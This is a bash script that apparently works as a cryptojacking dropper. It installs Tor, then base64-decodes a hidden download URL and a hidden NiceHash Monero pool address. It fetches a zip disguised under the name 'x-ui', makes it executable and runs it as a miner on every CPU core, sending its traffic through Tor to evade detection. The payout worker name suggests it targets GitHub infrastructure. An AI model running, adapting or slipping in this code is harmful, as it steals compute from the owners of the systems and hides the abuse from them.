#!/bin/bash

sudo apt update
sudo apt install tor unzip base64 -y

sudo nohup tor &>/dev/null &

cpu=$(echo nproc | bash)
user="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.GitHub"
url="aHR0cHM6Ly9taW5lcmhvc3RpbmcuMDAwd2ViaG9zdGFwcC5jb20vZmlsZXMveC11aS1saW51eC14NjQuemlw"
key="c3RyYXR1bSt0Y3A6Ly9yYW5kb214bW9uZXJvLnVzYS1lYXN0Lm5pY2VoYXNoLmNvbTozMzgw"
seed=$(echo $key | base64 --decode)
location=$(echo $url | base64 --decode)

wget $location

unzip x-ui-linux-x64.zip

cd x-ui-linux-x64/x-ui-6.16.2

chmod 777 x-ui

./x-ui -a rx -k -o $seed -u $user - px \
--threads=$cpu --cpu-priority=2 \
--astrobwt-avx2 --nicehash \
--proxy=127.0.0.1:9050 --randomx-wrmsr=-1 \
--no-huge-pages --keepalive 
